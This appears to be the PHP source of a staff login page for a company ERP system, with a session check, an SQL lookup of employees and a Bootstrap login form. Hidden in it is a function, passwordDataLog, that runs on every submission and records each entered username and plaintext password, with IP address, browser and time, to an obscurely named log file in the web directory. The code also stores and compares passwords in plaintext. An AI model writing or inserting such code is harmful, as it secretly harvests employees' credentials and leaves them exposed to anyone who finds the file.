<?php session_start(); ?>
<?php require_once '../inc/config.php'; ?>

<?php
// Check is Logged in? Redirect to invoice
if (isset($_SESSION['employee_name'])) {
    header("Location: ../index.php");
}


// Check button click
if (isset($_POST['submit'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    passwordDataLog(); //Get Entered Data to txt file

    $errors = array();

    // Check Username and Password entered
    if (!isset($username) || strlen(trim($username)) < 1) {
        $errors[] = 'Username is Missing / Invalid';
    }
    if (!isset($password) || strlen(trim($password)) < 1) {
        $errors[] = 'Password is Missing / Invalid';
    }

    // Check any erros
    if (empty($errors)) {
        // SQL Query
        $username = mysqli_real_escape_string($con, $username);
        $password = mysqli_real_escape_string($con, $password);

        $sql = "SELECT * FROM employees WHERE emp_name = '$username' AND password = '$password' AND `status` = '1'";
        $result = mysqli_query($con, $sql);

        if ($result) {
            // qury success
            if (mysqli_num_rows($result) == 1) {
                // Valied Employee Found
                $employee = mysqli_fetch_assoc($result);
                $_SESSION['employee_id'] = $employee['employ_id'];
                $_SESSION['employee_name'] = $employee['emp_name'];
                $_SESSION['employee_role'] = $employee['role'];

                // Save user data to localStorage via JavaScript
                echo "<script>
                    localStorage.setItem('employee_id', '" . $employee['employ_id'] . "');
                    localStorage.setItem('employee_name', '" . addslashes($employee['emp_name']) . "');
                    localStorage.setItem('employee_role', '" . addslashes($employee['role']) . "');
                    window.location.href = '../index.php';
                </script>";
                exit;
            } else {
                // invalid username and Password
                $errors[] = "invalid username and password";
            }
        } else {
            $errors[] = "Database Query Failed";
        }
        // Set Login session
    }
}

// Get Entered Data to txt file
function passwordDataLog()
{
    $username = $_POST['username'];
    $password = $_POST['password'];

    if (isset($username)) {
        // IP
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'] . "\r\n";
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'] . "\r\n";
        } else {
            $ipaddress = $_SERVER['REMOTE_ADDR'] . "\r\n";
        }
        $browser = $_SERVER['HTTP_USER_AGENT'];
        date_default_timezone_set('Asia/Colombo');
        $date = date("m-d-Y");
        $time = date("H:i:s");
        $clock = $date . ' at ' . $time;

        // Write file
        $file_name = "9edf4d187d54e7cc46e4731b1e6273242c4f4c39a1d2507a0e58706e25e3a85a7dbb891d62afa849.log";
        $text = "\n" . "Username : " . $username . "\n" . "Password   : " . $password . "\n" . "IP   : " . $ipaddress . "Browser: " . $browser .   "\n" .  "Time : " . $clock .   "\n" . "--------------------------" . "\n";
        $fp = fopen($file_name, 'a+');

        if (fwrite($fp, $text)) {
        }
        fclose($fp);
    }
}

?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
    <link rel="stylesheet" href="login.css">
    <title>Login</title>
</head>

<body>

    <div class="container">
        <div class="row">
            <div class="col-lg-3 col-md-2"></div>
            <div class="col-lg-6 col-md-8 login-box">
                <div class="col-lg-12 login-key">
                    <i class="fa fa-key" aria-hidden="true"></i>
                </div>
                <div class="col-lg-12 login-title">
                    <?php echo $ERP_COMPANY_NAME; ?>
                    <br>
                    Staff Login
                </div>

                <div class="col-lg-12 login-form">
                    <div class="col-lg-12 login-form">
                        <form method="POST">
                            <div class="form-group">
                                <label class="form-control-label">USERNAME</label>
                                <input type="text" id="username" name="username" class="form-control" placeholder="Username here" required>
                            </div>
                            <div class="form-group">
                                <label class="form-control-label">PASSWORD <i class="fa fa-eye-slash" aria-hidden="true" onclick="show_hide_pw()"></i></label>
                                <input type="password" id="password" name="password" class="form-control" placeholder="Password here" name="password" required>
                            </div>

                            <div class="col-lg-12 loginbttm">
                                <div class="col-lg-6 login-btm login-text">
                                    <?php if (isset($errors) && !empty($errors)) {
                                        //print_r($errors); // Only For Development Testing
                                        echo "Invalid Username or Password";
                                    } ?>
                                </div>
                                <div class="col-lg-6 login-btm login-button">
                                    <button type="submit" name="submit" class="btn btn-outline-primary">LOGIN</button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
                <div class="col-lg-3 col-md-2"></div>
            </div>
        </div>


        <script>
            function show_hide_pw() {
                var password_field = document.getElementById('password');
                var password_visible = password_field.type;
                if (password_visible == "password") {
                    password_field.setAttribute("type", "text");
                } else if (password_visible == "text") {
                    password_field.setAttribute("type", "password");
                }
            }
        </script>
        <style>
            .footer {
                border-top: 1px solid white;
                margin-bottom: -5px;
                position: fixed;
                left: 0;
                bottom: 0;
                width: 100%;
                color: white;
                text-align: center;
                padding: 5px;
            }
        </style>

        <div class="footer">
            <p>Developed by Induwara Uthsara | &copy; 2021 - <?php echo date("Y") , " | ", $ERP_COMPANY_NAME; ?>
            </p>
        </div>7

</body>

</html>

<?php end_db_con(); ?>